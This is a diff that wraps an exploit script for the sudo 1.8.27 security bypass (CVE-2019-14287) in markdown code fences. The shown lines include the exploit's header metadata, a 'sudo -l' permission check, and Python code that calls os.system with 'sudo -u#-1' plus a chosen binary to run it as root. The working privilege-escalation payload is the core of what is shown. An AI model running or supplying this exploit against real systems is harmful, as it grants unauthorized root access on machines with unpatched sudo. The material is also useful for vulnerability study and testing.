@@ -1,3 +1,4 @@
+```
 # Exploit Title : sudo 1.8.27 - Security Bypass
 # Date : 2019-10-15
 # Original Author: Joe Vennix
@@ -7,7 +8,7 @@
 # Credit : Joe Vennix from Apple Information Security found and analyzed the bug
 # Fix : The bug is fixed in sudo 1.8.28
 # CVE : 2019-14287
-
+```
 '''Check for the user sudo permissions
 
 sudo -l 
@@ -52,7 +53,7 @@ python3 sudo_exploit.py
 
 '''
 
-
+```python
 #!/usr/bin/python3
 
 import os
@@ -78,3 +79,4 @@ binary= binary_file.read()
 print("Lets hope it works")
 
 os.system("sudo -u#-1 "+ binary)
+```
